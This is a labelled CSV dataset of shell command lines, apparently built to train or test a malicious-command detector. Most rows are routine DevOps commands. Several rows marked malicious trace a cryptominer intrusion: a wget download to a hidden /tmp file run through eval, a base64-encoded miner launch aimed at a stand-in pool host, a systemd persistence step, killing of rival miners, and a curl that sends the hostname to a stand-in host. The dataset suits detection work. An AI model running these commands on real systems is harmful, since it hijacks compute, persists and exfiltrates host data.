process_name,command_line,label
terraform,terraform plan -out tfplan,benign
bash,"X='wget -q http://pkg-mirror-818.test/x -O /tmp/.X11-unix/.update'; eval ""$X""",malicious
npm,npm test -- --runInBand,benign
bash,ls -la /home/svc-web,benign
aws,aws s3 ls s3://search-artifacts/,benign
pip3,pip3 install -r requirements.txt,benign
git,git checkout develop,benign
node,node scripts/seed.js,benign
find,find /home/svc-web/platform -name '*.log' -mtime +7,benign
curl,curl -s http://localhost:8080/health,benign
git,git checkout feature/checkout,benign
tar,tar czf /backups/api-gateway-55.tgz /var/lib/api-gateway,benign
python3,python3 -m pytest tests/ -q,benign
docker,docker compose up -d api-gateway,benign
kubectl,kubectl rollout status deploy/redis,benign
curl,curl -fsS https://api.github.com/repos/data-pipeline/commits | head,benign
ssh,ssh svc-web@build-20 uptime,benign
tar,tar czf /backups/postgres-99.tgz /var/lib/postgres,benign
bash,"X='chmod +x /tmp/.X11-unix/.update'; eval ""$X""",malicious
grep,grep -r 'TODO' /home/svc-web/platform/src,benign
redis-cli,redis-cli ping,benign
git,git status,benign
python3,python3 /opt/app/manage.py migrate,benign
curl,curl -fsS https://api.github.com/repos/web-app/commits | head,benign
bash,echo bm9odXAgL3RtcC8uWDExLXVuaXgvLnVwZGF0ZSAtLW1heC1jcHU9NTAgLW8gcG9vbC5taW5leG1yLnRlc3Q6NDQ0NCAtdSA0ODFhNWQxMDg5ZDY1MzFhYTg1Yzk0ODg1ZDFhMWQ4OSA+L2Rldi9udWxsIDI+JjEgJg== | base64 -d | bash,malicious
free,free -m,benign
find,find /home/svc-web/billing-service -name '*.log' -mtime +7,benign
git,git commit -am 'fix: redis retry logic',benign
psql,psql -h db -U svc-web -c 'SELECT count(*) FROM orders;',benign
apt-get,apt-get install -y ripgrep,benign
systemctl,systemctl status payments,benign
ps,ps aux --sort=-%mem | head,benign
kubectl,kubectl logs deploy/postgres --tail 50,benign
systemctl,systemctl status worker,benign
docker,docker build -t api-gateway:26 .,benign
systemctl,systemctl --user enable session-sync.service,malicious
git,git log --oneline -n 10,benign
curl,curl -fsS https://api.github.com/repos/infra/commits | head,benign
bash,cd /home/svc-web/mobile-api && ls,benign
systemctl,systemctl restart postgres,benign
npm,npm run build,benign
npm,npm ci --no-audit,benign
go,go build ./...,benign
docker,docker build -t api-gateway:97 .,benign
kubectl,kubectl rollout status deploy/nginx,benign
git,git pull origin main,benign
pkill,pkill -f 'xmrig|kdevtmpfsi' 2>/dev/null,malicious
kubectl,kubectl get pods -n production,benign
systemctl,systemctl status nginx,benign
find,find /home/svc-web/mobile-api -name '*.log' -mtime +7,benign
journalctl,journalctl -u postgres --since '10 min ago',benign
htop,htop -d 5,benign
uptime,uptime,benign
apt-get,apt-get install -y git-lfs,benign
docker,docker logs --tail 100 postgres,benign
git,git pull origin hotfix/login,benign
make,make lint,benign
nproc,nproc --all,malicious
docker,docker build -t search:62 .,benign
apt-get,apt-get install -y htop,benign
scp,scp report.csv svc-web@reports:/srv/reports/,benign
curl,curl -fsS https://api.github.com/repos/platform/commits | head,benign
find,find /home/svc-web/data-pipeline -name '*.log' -mtime +7,benign
aws,aws s3 ls s3://redis-artifacts/,benign
docker,docker build -t search:87 .,benign
ssh,ssh svc-web@build-72 uptime,benign
docker,docker build -t auth-svc:64 .,benign
kubectl,kubectl rollout status deploy/search,benign
grep,grep -r 'TODO' /home/svc-web/billing-service/src,benign
df,df -h,benign
kubectl,kubectl rollout status deploy/api-gateway,benign
aws,aws s3 ls s3://worker-artifacts/,benign
systemctl,systemctl restart auth-svc,benign
journalctl,journalctl -u payments --since '10 min ago',benign
curl,curl -s http://pkg-mirror-818.test/r -d host=$(hostname),malicious
aws,aws s3 ls s3://postgres-artifacts/,benign
journalctl,journalctl -u redis --since '10 min ago',benign
rsync,rsync -az /home/svc-web/mobile-api/dist/ /var/www/api-gateway/,benign
docker,docker build -t redis:25 .,benign
ssh,ssh svc-web@build-81 uptime,benign
